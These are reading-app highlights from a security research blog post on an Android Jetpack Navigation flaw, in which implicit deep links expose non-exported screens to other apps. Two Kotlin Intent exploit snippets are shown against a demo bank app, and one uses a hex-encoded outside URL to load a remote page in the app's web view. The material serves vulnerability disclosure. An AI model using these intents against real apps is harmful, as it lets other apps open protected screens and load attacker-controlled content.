---
author: admin
aliases:
  - "Android Jetpack Navigation: Go Even Deeper"
tags:
  - RW_inbox
  - readwise/articles
  - Android
url: https://swarm.ptsecurity.com/android-jetpack-navigation-go-even-deeper/
created: 2024-11-22
---
# Android Jetpack Navigation: Go Even Deeper

![rw-book-cover](https://swarm.ptsecurity.com/wp-content/uploads/2024/08/63e8de2c-04f52ff568fe31133d40161426984aa4.png)

## Highlights


Previous research
 Some time ago, my colleague [discovered an interesting vulnerability](https://swarm.ptsecurity.com/android-jetpack-navigation-deep-links-handling-exploitation/) in the Jetpack Navigation library, which allows someone to open any screen of the application, bypassing existing restrictions for components that are not exported and therefore inaccessible to other applications. The issue lies with an implicit deep link processing mechanism, which any application on the device can interact with.
> [View Highlight](https://read.readwise.io/read/01jdac3pvr1aenjhqke4p9ydyr)



The issue with this warning is that, based on the documentation, it only concerns the [APIs for creating explicit deep links](https://developer.android.com/guide/navigation/design/deep-link#explicit) when the problem is actually much deeper.
> [View Highlight](https://read.readwise.io/read/01jdac49jwmeaz2ah7vfw38n3x)



Exploiting implicit deep links
> [View Highlight](https://read.readwise.io/read/01jdac4mvkazhswraac5e7p03c)



Here is the exploit code:
> [View Highlight](https://read.readwise.io/read/01jdac6p63a7sw2r7sa2x4n67p)



Intent().apply { setClassName("com.ptsecurity.supersecurebank", "com.ptsecurity.supersecurebank.MainActivity") data = Uri.parse("android-app://androidx.navigation/Main") startActivity(this) }
> [View Highlight](https://read.readwise.io/read/01jdac6cjx8g8a4xjzrg09bkc3)



Intent().apply { setClassName("com.ptsecurity.supersecurebank", "com.ptsecurity.supersecurebank.MainActivity") data = Uri.parse("android-app://androidx.navigation/WebContent/%68%74%74%70%73%3a%2f%2f%33%35%36%6d%39%61%6d%39%32%35%32%64%65%6f%74%76%66%73%35%7a%71%62%69%31%6c%73%72%6a%66%39%33%79%2e%6f%61%73%74%69%66%79%2e%63%6f%6d") startActivity(this) }
> [View Highlight](https://read.readwise.io/read/01jdac79dt12ky8asrra4n14ex)



Investigating the problem of implicit deep links
 First, let’s explore the issue in the debugger, and then find the source code that made this vulnerability possible. We’ll set a breakpoint in the code executed during the transition. After examining the objects in memory, you can see that by the time the transition to the screen occurs, an implicit deep link has already been created without any involvement from the developer.
> [View Highlight](https://read.readwise.io/read/01jdac8382n17pseqwwdbjck6z)



After this function is executed, the deep link `android-app://androidx.navigation/WebContent/{url}` will appear in the application, which can be accessed from another application by passing the url parameter without any restrictions.
> [View Highlight](https://read.readwise.io/read/01jdac8pqr9t5jm8megfw1sx0j)



Conclusions
 There have been [many](https://people.cs.vt.edu/gangwang/deep17.pdf) [different](https://hackerone.com/reports/401793) [publications](https://ash-king.co.uk/blog/facebook-bug-bounty-09-18) about the risks related to deep links. The issue is well known to security researchers. Errors related to explicit deep links are regularly found and exploited by attackers. It’s hard to understand why anyone would want to make the issue more complicated than it already is.
 What should application developers do? The most obvious advice is **not to use this library**.
> [View Highlight](https://read.readwise.io/read/01jdac96hj0f4f4qcxb7fxjczx)

